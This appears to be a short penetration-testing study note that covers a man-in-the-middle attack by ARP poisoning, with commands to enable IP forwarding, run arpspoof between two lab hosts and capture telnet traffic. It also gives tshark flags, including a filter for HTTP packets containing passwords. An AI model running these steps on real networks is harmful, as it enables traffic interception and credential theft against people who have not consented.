
# Overview
A network based attack deals with protocols traversing the network and not stuff related to the operating system of a host.

# Man in the Middle
## Arp Poisoning

Turn on ip forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

Spoof that you are .37 to the .36 machine
```bash
arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
```
Record traffic with Wireshark to intercept telnet


# Tools
## tshark
Terminal tool like wireshark for scripting with pcaps
- -D : to list interfaces
- -i : run on interface
- -r fipe.pcap : view pcap
- `-Y 'ip.src==192.168.23.2'` : filter
- -Y 'http contains password'